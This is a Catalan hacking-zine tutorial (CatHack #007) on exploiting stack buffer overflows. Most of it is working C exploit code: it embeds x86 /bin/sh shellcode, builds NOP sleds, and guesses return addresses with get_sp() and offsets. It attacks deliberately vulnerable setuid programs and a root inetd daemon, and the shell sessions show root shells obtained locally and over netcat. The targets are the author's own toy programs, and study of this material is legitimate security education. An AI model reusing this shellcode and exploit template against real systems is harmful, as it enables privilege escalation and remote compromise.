.------------------.
| CatHack #007 - 2 |
| 07x02 - BufOvrfl |
| programació/hack |
`------------------'


/**************************************
 * Buffer Overflows - Part 2          * 
 *****************************by KL4RK*/

NOTA: Re-llegint el text anterior i llegint aquest us adonareu
que faig servir termes que tenen poc a veure amb el lèxic català;
però des del meu punt de vista, el verb "overflowejar" te un
significat comprensible (no?)


Amb aquesta continuació del primer text sobre buffer overflows
intentarem aprendre com explotar els buffer overflows, és a dir,
programar els nostres exploits.

RE-INTRO
--------

A l'anterior text explicava el concepte de buffer overflow, i vam
construir un programa que overflowejava un buffer d'ell mateix. Això
cosa ens donava una shell amb id de l'usuari que executava el 
programa.

Recordem com funcionava:

int main(void) {
        char a[640];
        funcio();
        if(2==3) system("/bin/sh");	
        exit(0);
}
void funcio() {
        char c[640];
        int i=0;
        for (i=0;i<644;i++) c[i]='A';
        c[i++]=0xb4;
        c[i++]=0x84;
        c[i++]=0x04;
        c[i++]=0x08;  /* volem arribar a 0x80484b4 (@ de system("/bin/bash)*/
        return;
}

El programa escrivia 'A' dins de totes les posicions, 4 més enllà,
i aleshores una direcció que sobreescrivia la direcció de retorn de
la funcio() (cap a main(), o cap a la funció que el cridés):

    LA PILA:

|               |
|---------------|
|               |
|     ...	|
|		|
|    espai 	|
|    de 640	|
|    bytes      |
|    per a      |
|    c[640]     |
|               |
|     ...       |
|               |
|---------------|  
|  EBP salvat   |
|---------------|  
|     @ RET     |
+---------------+  
	.
	.
	.

Passava a ser:

|               |
|---------------|  
|     (...)     |
|      'A'      |
|      'A'      |
|      'A'      |
|      'A'      |
|      'A'      |
|      'A'      |
|      'A'      |
|      'A'      |
|     (...)     |
|---------------|   
|   0x41414141  | <-- 0x41414141 = "AAAA"
|---------------|  
|   NOVA @RET   | <-- la @ de retorn que apuntava a la
+---------------+   adreça de system("/bin/bash") en main


I el programa saltava a system("/bin/bash").

Això explica el funcionament teòric dels buffer overflows, però
no conec ningú que escrigui programes que s'"overflowegin" ells
mateixos (almenys no voluntàriament).



TROBAR ELS BUGS
---------------

Realment, trobar overflows no és tant difícil, com podria semblar.
Ens hem de fixar en la manera com el nostre programa escriu dins dels
buffers. Si per exemple es fes

char    buffer[1024];
char buff_gran[2048];
(...)
strcpy(buffer,buff_gran);

Donat el cas que strlen(buff_gran) > 1024 tindriem un overflow.

Altres funcions que poden generar-ne: gets(), fprintf(), etc. En ralitat,
moltíssimes funcions poden crear un problema d'aquest tipus si son mal
utilitzades.



BUG -> EXPLOIT
--------------


a) EL PROGRAMA.

Anem a aplicar aquest coneixement teòric sobre, primerament, un
programa molt estúpid que il.lustrarà el tema:

(gràcies a la gent de NetSearch, que m'han ajudat una barbaritat
a entendre i fer que tot això entrés dins el meu cap. Sobretot a
RaiSe i alfonsmc. I també als textos de Aleph One, Mudge i els de
w00w00)


/* inici de eco.c */
int main(int argc, char **argv)
{
        char buffer[1024];
        if (argc < 2) exit(0);
        strcpy(buffer,argv[1]);
        printf(">>>%s\n",buffer);
        return(0);
}
/* final de eco.c */

Aquest programa crea un buffer de 1024 caracters, i a continuació
llegeix el primer argument i el repeteix:

$gcc eco.c -o eco

$./eco
$./eco blabla
>>>blabla
$./eco blabla bla
>>>blabla
$

b) SETUID

Funciona com esperàvem. Aquest programa, APARENTMENT tant inofensiu,
imaginem que té com a  propietari l'usuari root (perquè és part d'un
programa més gran, per equivocació, o per la raó que volgueu). Fem,
doncs, que sigui propietat de l'usuari root. I imaginem no només això,
sinó que a més, té el bit setuid activat, és a dir, que és propietat
del root, i que quan s'executa, faci qui ho faci, s'executa amb
privilegis de root.


Exemples de programes que funcionin d'aquesta manera: mount, ping, 
traceroute, passwd, crontab, sendmail, su...

(Per trobar tots els programes setuid del vostre linux, feu
  find / -perm -4000   )


Doncs ara que ens ho hem imaginat, fem que les condicions de l'arxiu
eco siguin aquestes esmentades:

$su
Password:
#chown root eco     /* (owner=root) */
#chmod a+s eco      /* (setuid=si)  */
#exit
$

Ara el programa fa exactament el mateix que abans, però s'executa com a
root.


c) TROBAR EL PROGRAMA

I ara ens fiquem dins la pell d'un hacker que vol aconseguir root al nostre
sistema, al qual té accés a nivell d'usuari i al directori on és eco.
Procedim d'aquesta manera:

kiddie$ cd /home/kiddie
kiddie$ ls -al
total 24
drwxrwxr-x    2 user12   root         4096 Oct  5 12:37 .
drwxrwxr-x    4 user12   user12       4096 Oct  5 12:37 ..
-rwsrwsr-x    1 root     user12      11975 Oct  5 12:37 eco
-rw-rw-r--    1 user12   root          179 Oct  5 12:33 eco.c

Aleshores ens fiquem dins el nostre paper i exclamem: hi ha un arxiu
que s'executa com a root!! Com ho hem sapigut?

-rwsrwsr-x    1 root     user12      11975 Oct  5 12:37 eco
   |             | 
   |             ·-> l'owner (propietari) del programa és el root.
   ·-> la s vol dir que es setuid (s'executa amb id del owner).

I contents per la nostra troballa, examinem el codi del programa: eco.c

kiddie$ cat eco.c
/* inici de eco.c */
int main(int argc, char **argv)
{
        char buffer[1024];
        if (argc < 2) exit(0);
        strcpy(buffer,argv[1]);
        printf(">>>%s\n",buffer);
        return(0);
}
/* final de eco.c */


d) EL BUG I COM EXPLOTAR-LO

Molt a simple vista, ens adonem que aquest programa té un problema: el buffer
on es copia l'argument és de 1024 caràcters. I si l'argument és més llarg?
Buffer overflow.

Doncs au, sense pensar-hi gaire més, creem l'exploit. Sabem que el buffer és
de 1024 caràcters. Primer que res, pensem: com podem obtenir una shell???
Doncs és obvi que hem de fer que s'executi un codi que ens la doni. I on és aquest
codi? Doncs no hi és. I si no hi és, l'hem de posar nosaltres. 

Recordem que quan haguem explotat el programa tindrem la possibilitat de fer-lo
saltar cap al lloc que nosaltres volguem. Doncs la resposta als nostres maldecaps
és la següent: situem un codi que doni una shell a dins del buffer del programa,
i fem que aquest executi el buffer (cosa que en condicions normals mai passaria:
fixeu-vos que estem fent-li executar una regió de memòria en teoria reservada per
dades).

El codi que ens donarà una shell el podem treure de qualsevol altre exploit per
sistemes linux/intel. Usarem aquest: 

     char execshell[] =
          "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
          "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
          "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";

Ara ens quedaria fer:
	-Omplir les primeres posicions del buffer del programa amb execshell[]
	-Acabar d'omplir el buffer
	-Sobreescriure l'adreça de retorn pq apunti al propi buffer.

e) L'ADREÇA DE RETORN

I aquí se'ns planteja un problema. Sobreescrivim l'adreça de retorn, però amb quina
adreça? Amb l'adreça del buffer del programa. I quina és aquesta adreça? 

..

La resposta és que exactament no ho sabem, però sabem que es troba a la pila. Què podem
fer? Podem intentar endivinar-la a partir de l'adreça on comença la pila.

Però això implicaria que hauriem de saber exactament a quina adreça comença el buffer
en el programa, i això no és gens fàcil, perquè pot variar de sistema a sistema.

Una solució més intel.ligent seria:
	-Omplir les primeres posicions del buffer amb NOPs
	-Acabar d'omplir el buffer amb execshell[]
	-Sobreescriure l'adreça de retorn amb la de qualsevol dels NOP's anteriors.

Recordèm què és un NOP: una instrucció del processador intel/compatible que simplement
equival a "seguir", és a dir, el processador no fa res més que passar a la seguënt
instrucció.

A veure si ens entenem. Hem d'aconseguir que la pila quedi així:

[NOP][NOP](...)[NOP][NOP][NOP][NOP][NOP][NOP][-----SHELLCODE----][@RET sobresecrita]


Amb la qual cosa, és molt més fàcil d'endevinar una adreça vàlida on saltar, ja que
tenim un munt de NOPs els quals al ser executats ens duran al shellcode.

Ara l'exploit funcionarà si encertem una sola de les posicions de memòria dels centenars
de NOPs que hi ha dins del buffer. Ara creem l'exploit, partint d'aquesta idea.

int main(int argc, char **argv) {
	char execshell[] =
          "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
          "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
          "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
	char buffer[1024+8+1];
			/* 1024 per omplir el buffer + 4 per sobreescriure EBP 	*/
			/* + 4 per sobreescriure EIP + 1 caracter nul per aca- 	*/
			/* bar la cadena de "text" :-)				*/
	int i;
	char *ptr;
	unsigned long *ptr2;
	ptr=buffer;
        for(i=0;i<1024-strlen(execshell);i++) *(ptr++) = 0x90;
			/* Omplim de NOPs (0x90 en llenguatge maquina) les pri- */
			/* meres posicions del buffer				*/

	for(i=0;i<strlen(execshell);i++)
		*(ptr++) = execshell[i];
			/* A continuació hi fiquem el codi de la shell		*/
			
			/* i preparem punters per escriure una adreça dins el buffer */
	ptr=buffer;
	ptr2=(long *) &ptr[1024];

			/* Escrivim uns valors per EBP i EIP			*/
	*(ptr2++)= 0x41424344;
	*(ptr2++)= 0x41414141;     /* encara no sabem quin valor donar-li	*/
	buffer[1024+8]=0x00;	   /* string acabat en NULL			*/

	execl("./eco","eco",buffer,0x00);  /* executem ./eco buffer		*/
	return 0;
}


Ara hauriem de poder provocar un buffer overflow que faria saltar el processador cap a
0x41414141, la qual cosa hauria de provocar un Segmentation Fault. Comprovem-ho:

kiddie$ gcc xploit.c -o xploit
kiddie$ ./xploit
Segmentation fault (core dumped)

Ara haurem de buscar millor la adreça on volem saltar.


f) GET_SP (BANG!!)

TOTS els programes que s'executen en una mateixa màquina tenen l'inici de la pila en
la mateixa posició de memòria. Podríem fer que l'exploit busqués on comença la seva
pila, i usar aquesta mateixa adreça com a direcció de retorn de l'exploit:

int get_sp(void) {
	__asm__("movl %esp,%eax");
		/* Posa %esp (registre que conté l'adreça del TOP de la pila)	*/
		/* en %eax   (registre que serveix per retornar les dades)	*/
}



int main(int argc, char **argv) {
	char execshell[] =
          "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
          "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
          "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
	char buffer[1024+8+1];
			/* 1024 per omplir el buffer + 4 per sobreescriure EBP 	*/
			/* + 4 per sobreescriure EIP + 1 caracter nul per aca- 	*/
			/* bar la cadena de "text" :-)				*/
	int i;
	char *ptr;
	unsigned long *ptr2;
	ptr=buffer;
        for(i=0;i<1024-strlen(execshell);i++) *(ptr++) = 0x90;
			/* Omplim de NOPs (0x90 en llenguatge maquina) les pri- */
			/* meres posicions del buffer				*/

	for(i=0;i<strlen(execshell);i++)
		*(ptr++) = execshell[i];
			/* A continuació hi fiquem el codi de la shell		*/
			
			/* i preparem punters per escriure una adreça dins el buffer */
	ptr=buffer;
	ptr2=(long *) &ptr[1024];

			/* Escrivim uns valors per EBP i EIP			*/
	*(ptr2++)= 0x41424344;
	*(ptr2++)= get_sp();     
	buffer[1024+8]=0x00;	   /* string acabat en NULL			*/

	execl("./eco","eco",buffer,0x00);  /* executem ./eco buffer		*/
	return 0;
}

kiddie$ gcc xploit.c -o xploit
kiddie$ ./xploit
>>>(...simbols...)/bin/sh
bash# id
uid=501(kiddie) gid=501(kiddie) euid=0(root) groups=501(kiddie)
bash# exit
kiddie$

Voi-la, som root. (si en la vostra màquina no ha funcionat, seguiu llegint)

g) OFFSET

Molts cops aquesta adreça no serà bona. Aleshores podem fer que l'exploit accepti com a
argument un valor anomenat offset (desplaçament) i així podrem anar provant valors, fins
que trobem (si hi ha sort) algun que faci funcionar l'exploit.

int get_sp(void) {
	__asm__("movl %esp,%eax");
		/* Posa %esp (registre que conté l'adreça del TOP de la pila)	*/
		/* en %eax   (registre que serveix per retornar les dades)	*/
}

int main(int argc, char **argv) {
	char execshell[] =
          "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
          "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
          "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
	char buffer[1024+8+1];
	int i;
	char *ptr;
	unsigned long *ptr2;

	if (argc < 2) { printf("%s offset\n",argv[0]); exit(0); }
			/* Comprovació que hi ha l'argument offset		*/

	ptr=buffer;	
        for(i=0;i<1024-strlen(execshell);i++) *(ptr++) = 0x90;

	for(i=0;i<strlen(execshell);i++)
		*(ptr++) = execshell[i];

	ptr=buffer;
	ptr2=(long *) &ptr[1024];

			/* Escrivim uns valors per EBP i EIP			*/
	*(ptr2++)= 0x41424344;
	*(ptr2++)= get_sp()+atoi(argv[1]);     
			/* EIP = get_sp() + offset_donat			*/

	buffer[1024+8]=0x00;

	execl("./eco","eco",buffer,0x00);  /* executem ./eco buffer		*/
	return 0;
}


I ara? Ara, a provar offsets, fins que trobem un offset guanyador, i obtinguem
una shell.

Els offsets que hem de provar han de ser d'acord amb la quantitat de NOPs que hem
insertat en el buffer. En el nostre cas, son mes de 800 NOPs; per això, podem
provar els offsets de 800 en 800. En la meva màquina valen offsets des de -948
fins a 34.

Amb el nostre exemple concret:

kiddie$ gcc exploit.c -o exploit
kiddie$ ./exploit
/exploit offset
kiddie$ ./exploit 0
>>>(simbols)/bin/sh
bash# exit
kiddie$


SEGON PROGRAMA A EXPLOTAR
-------------------------

També ens podem trobar que el programa agafi una cadena de l'entrada estàndard.
Per exemple:

/* inici de hola.c */
#include <stdio.h>


int main(void)
{
        char buffer[2048];
        printf("Escriu el teu nom: ");
        fflush(stdout);
        gets(buffer);
        printf("Hola, %s\n",buffer);
}
/* final de hola.c  */

$ gcc hola.c -o hola
/tmp/ccbHNONd.o: In function `main':
/tmp/ccbHNONd.o(.text+0x2c): the `gets' function is dangerous and should not be used.
$ ./hola
Escriu el teu nom: latex
Hola, latex
$ su
Password:
# chown root hola
# chmod a+s hola
# exit
$

Per crear un exploit, podem aprofitar en gran part l'exploit anterior. Però hi ha
un parell de diferències: primer que ara el buffer es de 2048 bytes, i segon, la
manera com s'escriu el buffer.

El que podriem fer es que l'exploit funcionés com a entrada del programa a explotar.

Per fer-ho hem de tenir una petita idea de l'"entubament" en linux (unix en general):

/programa_1 | ./programa_2

Executa programa_1 i dirigeix la sortida de text d'aquest cap a l'entrada de programa_2.

Si fem
$ echo EL_MEU_NOM | ./hola
Escriu el teu nom: Hola, EL_MEU_NOM
$

En aquest cas, l'exploit faria més o menys "echo [cadena-que-explota-el-bug]". Però
si fessim simplement ./exploit_gets offset | ./hola   , no arribariem enlloc, perquè
el programa hola ens donaria una shell, la qual també necessita tenir una entrada de
text. Aquesta seria la manera:

(./exploit_gets offset;cat) | ./hola

I ara ocpuem-nos de l'exploit: bàsicament el mateix, substituint 1024 per 2048 i
l'execl final per printf("%s\n",buffer):

int get_sp(void) {
        __asm__("movl %esp,%eax");
}

int main(int argc, char **argv) {
        char execshell[] =
          "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
          "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
          "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
        char buffer[2048+8+1];
        int i;
        char *ptr;
        unsigned long *ptr2;

        if (argc < 2) { printf("%s offset\n",argv[0]); exit(0); }

        ptr=buffer;
        for(i=0;i<2048-strlen(execshell);i++) *(ptr++) = 0x90;

        for(i=0;i<strlen(execshell);i++)
                *(ptr++) = execshell[i];
        ptr=buffer;
        ptr2=(long *) &ptr[2048];

        *(ptr2++)= 0x41424344;
        *(ptr2++)= get_sp()+atoi(argv[1]);

        buffer[2048+8]=0x00;

        printf("%s\n",buffer);
        return 0;
}

$ gcc x.c -o x
$ (./x 0;cat)|./hola 
Escriu el teu nom: Hola, ÉÉÉÉÉÉÉÉÉÉÉ(...)/bin/sh(...)
$ (./x -1000;cat)|./hola
Escriu el teu nom: Hola, ÉÉÉÉÉÉÉÉÉÉÉ(...)/bin/sh(...)
$ (./x 1000;cat)|./hola
Escriu el teu nom: Hola, ÉÉÉÉÉÉÉÉÉÉÉ(...)/bin/sh(...)

id
uid=501(user) gid=501(user) euid=0(root) groups=501(user)
ls -al /root
   ..    .bashrc   (...)
exit

$
Amb el qual hem aconseguit una shell de root.


BUG i EXPLOIT 3 (dimoni amb inetd!)
-----------------------------------

Imaginem ara un dimoni que simplement agafa de l'entrada el teu nom complet
i te'l repeteix (fem servir el mateix programa que abans: hola.c

$ gcc hola.c -o hola
$ su
Password:
# cp inetd.conf inetd.conf.backup
# echo "pop-2 stream tcp nowait root /usr/sbin/tcpd /home/kiddie/hola" >> /etc/inetd.conf
# killall -HUP inetd
     (Això instal.larà el dimoni hola a escoltar al port del pop-2
     (109) si /home/kiddie/ es el directori on està hola.)
# exit
$ telnet 127.0.0.1 109
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Escriu el teu nom: latex
Hola, latex
Connection closed by foreign host.
$

Ara agafem l'anterior exploit i l'usem així:

(./x offset;cat) | nc 127.0.0.1 109

nc és el NetCat, que farem servir per dirigir el nostre atac contra el port 109:

$ (./x 0;cat) | nc 127.0.0.1 109
Escriu el teu nom:
$ (./x 1000;cat) | nc 127.0.0.1 109
Escriu el teu nom:


id
uid=0(root) gid=0(root) groups=0(root)
exit

$

Com podeu veure, hem aconseguit un exploit remot pel dimoni hola.

!!!
     No us oblideu de desinstal.lar el dimoni fent (com a root)
     mv /etc/inetd.conf.backup /etc/inetd.conf;killall -HUP inetd  
!!!


Conclusió
---------

Ara ja tenim les bases per fer qualsevol tipus d'overflow.

Si no ho heu acabat d'entendre, us recomano els textos següents:
"Smashing the stack for fun and profit" (by Aleph 1, de l0pht)
"tutorial on buffer overflows"		(by mudge)

I si ho heu entès
	a) passeu al següent nivell:
		Heap Overflows, de w00w00
	b) aneu a roothat.labs.pulltheplug.com i intenteu participar
		en el joc (per mes info, http://roothat.labs.pulltheplug.com)
	   És un joc molt didàctic.
